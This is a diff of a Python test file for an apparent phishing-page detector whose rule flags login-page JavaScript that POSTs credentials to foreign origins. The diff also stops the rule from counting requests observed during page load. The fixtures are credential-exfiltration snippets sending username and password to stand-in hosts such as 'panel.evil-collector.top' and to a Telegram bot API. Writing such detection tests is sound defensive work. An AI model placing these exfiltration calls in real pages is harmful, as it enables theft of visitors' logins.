@@ -59,7 +59,7 @@ def test_exfil_never_fires_without_a_credential_input():
 # ---- S2: credential capture to a foreign origin ----------------------------------------------------------------
 def test_spa_bundle_posting_to_a_foreign_origin_fires():
     js = 'async function s(u,p){await fetch("https://panel.evil-collector.top/api/save",{method:"POST",body:JSON.stringify({u,p})})}'
-    hits = foreign_post_endpoints(PW, [("https://meesho-all.cfd/assets/index.js", js)], [], PAGE, legit_sites=set())
+    hits = foreign_post_endpoints(PW, [("https://meesho-all.cfd/assets/index.js", js)], PAGE, legit_sites=set())
     assert [h.origin for h in hits] == ["https://panel.evil-collector.top"]
     assert hits[0].where == "https://meesho-all.cfd/assets/index.js"
 
@@ -67,7 +67,7 @@ def test_spa_bundle_posting_to_a_foreign_origin_fires():
 def test_xhr_axios_jquery_and_beacon_forms_are_recognised():
     for js in ['x.open("POST", "https://c.evil.top/a")', 'axios.post("https://c.evil.top/a", d)',
                '$.ajax({url: "https://c.evil.top/a", type: "POST", data: d})', 'navigator.sendBeacon("https://c.evil.top/a", d)']:
-        assert [h.origin for h in foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, set())] == \
+        assert [h.origin for h in foreign_post_endpoints(PW, [("inline#0", js)], PAGE, set())] == \
             ["https://c.evil.top"], js
 
 
@@ -76,19 +76,34 @@ def test_same_site_brand_site_and_benign_third_parties_do_not_fire():
           'fetch("https://www.google-analytics.com/g/collect",{method:"POST"});'
           'fetch("https://www.google.com/recaptcha/api2/reload",{method:"POST"});'
           'fetch("https://supplier.meesho.com/login",{method:"POST"})')
-    assert foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, legit_sites={"meesho.com"}) == []
+    assert foreign_post_endpoints(PW, [("inline#0", js)], PAGE, legit_sites={"meesho.com"}) == []
 
 
 def test_get_requests_do_not_count():
     js = 'fetch("https://cdn.other.top/config.json")'
-    assert foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, set()) == []
+    assert foreign_post_endpoints(PW, [("inline#0", js)], PAGE, set()) == []
 
 
-def test_observed_post_during_load_counts():
-    hits = foreign_post_endpoints(PW, [], [("POST", "https://c.evil.top/visit", "fetch")], PAGE, set())
-    assert [(h.origin, h.where) for h in hits] == [("https://c.evil.top", "network: POST during page load")]
+def test_requests_observed_during_page_load_do_not_count():
+    """S2 refinement (owner, 2026-10-07): 5 of the 6 gate false positives were analytics/telemetry POSTs fired while
+    a legitimate login page loaded. Only POSTs written in the page's code count."""
+    hits = foreign_post_endpoints(PW, [], PAGE, set())
+    assert hits == []
+
+
+def test_a_bare_scheme_is_not_a_destination():
+    """The LinkedIn gate false positive was the string "https://www." in a bundle: not a URL, never a destination."""
+    js = 'fetch("https://www.",{method:"POST"}); axios.post("https://localhost/x"); $.post("https://x/y")'
+    assert foreign_post_endpoints(PW, [("inline#0", js)], PAGE, set()) == []
 
 
 def test_foreign_post_needs_a_credential_input():
     js = 'fetch("https://c.evil.top/a",{method:"POST"})'
-    assert foreign_post_endpoints("<p>hi</p>", [("inline#0", js)], [], PAGE, set()) == []
+    assert foreign_post_endpoints("<p>hi</p>", [("inline#0", js)], PAGE, set()) == []
+
+
+def test_s2_reports_an_exfil_api_post_too_the_shared_independence_rule_dedups_it():
+    """No special case inside S2: a POST to the Telegram API is a foreign POST. Counting it once is the job of the
+    shared independence rule in confirm.py (test_confirm: one endpoint is one strong signal)."""
+    js = 'fetch("https://api.telegram.org/bot7012345678:AAH' + "x" * 32 + '/sendMessage",{method:"POST"})'
+    assert [h.origin for h in foreign_post_endpoints(PW, [("inline#0", js)], PAGE, set())] == ["https://api.telegram.org"]
